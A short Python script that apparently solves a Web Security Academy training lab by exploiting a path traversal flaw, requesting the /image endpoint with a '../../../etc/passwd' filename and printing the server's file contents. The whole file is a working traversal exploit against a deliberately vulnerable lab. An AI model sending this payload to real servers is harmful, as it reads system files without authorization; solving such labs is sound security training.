from web_security_academy.core.logger import logger
from urllib.parse import urlencode


def solve_lab(session):
    path = "/image"
    params = {"filename": "/var/www/images/../../../etc/passwd"}

    logger.info(
        f'Exploiting path traversal vulnerability by visiting "{path}?{urlencode(params)}"...'
    )
    resp = session.get_path(path, params=params)

    if resp.status_code != 200:
        logger.failure("Unable to get contents of file.")
    else:
        logger.success("GET request came back with the following response:")
        print(resp.text)
